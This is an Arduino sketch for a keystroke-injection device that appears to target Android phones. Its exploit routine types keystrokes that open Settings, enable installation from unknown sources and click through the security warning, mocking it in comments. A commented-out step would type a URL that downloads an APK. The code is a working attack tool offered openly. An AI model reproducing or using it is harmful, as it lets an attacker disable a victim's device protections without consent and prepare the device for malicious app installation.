#define KEY_DELAY 50

uint8_t buf[8] = { 
  0 }; 	/* Keyboard report buffer */
 
void setup() 
{
  Serial.begin(9600);
  randomSeed(analogRead(0));
  delay(200);
}
 
void loop() 
{
  exploit();
  while (42) {}
}
 
void sendKey(int key) 
{
  buf[2] = key;
  Serial.write(buf, 8);
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);	// Release key  
}

void sendKeyShift(int key)
{
  buf[2] = 0xE1;
  Serial.write(buf, 8);
  sendKey(key);
  
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8); // Release shift
}
  

void sendStr(char *string)
{
  for (int i=0; i < strlen(string); i++) {
    char c = string[i];
    if (c >= 97 && c <= 122) //a-z
      sendKey(string[i]-97 + 0x04); //in keyboard codes, a is 0x04
    if (c == ':')
      sendKeyShift(0x33);
    if (c == '/')
      sendKey(0x38);
    if (c == '.')
      sendKey(0x37);
  }
}

void down()
{
  delay(KEY_DELAY);
  sendKey(0x51);
}

void up()
{
  delay(KEY_DELAY);
  sendKey(82);
}

void left()
{
  delay(KEY_DELAY);
  sendKey(0x50);
}

void right()
{
  delay(KEY_DELAY);
  sendKey(0x4F);
}

void clic()
{
  delay(KEY_DELAY);
  sendKey(0x28);
}

void back()
{
  delay(KEY_DELAY);
  sendKey(41);
}

void goHome()
{
  for (int i=0; i < 30; i++) {
    delay(10);
    sendKey(41);
  }
  //buf[0]=226; //leftAlt
  //sendKey(41); //esc
  //sendKey(74);   
}

void exploit()
{
  delay(700);
  sendKey(44); //space
  delay(200);
  sendKey(44);delay(200);
  sendKey(44);delay(200);
  sendKey(44);
  
  delay(500);
  
  goHome();
  //sendKey(3); //home (idk how though)
  
  delay(100);
  
  /*sendStr("perihelion.io/takecharge.apk");
  
  //accept stupid security warning, LOL
  clic();
  right();
  right();
  clic();
  
  //now the apk is downloading, while that's going let's enable developer options
  goHome();*/
  
  sendStr("settings");
  down();
  down();
  down();
  down();
  left();
  clic();
  
  //now we're in settings
  //just in case they already had settings open, let's go all the way to the top
  for (int i = 0; i < 20; i++) {
    up();
  }
  
  //go to security options
  for(int i = 0; i < 12; i++) {
    down();
  }
  clic();
  
  delay(100);
  
  //click on unknown sources
  for(int i = 0; i < 8; i++) {
    down();
  }
  clic();
  
  delay(50);
  
  //confirm security dialog, LOL
  right();
  right();
  clic();
  
  delay(100);
  
  goHome();
}
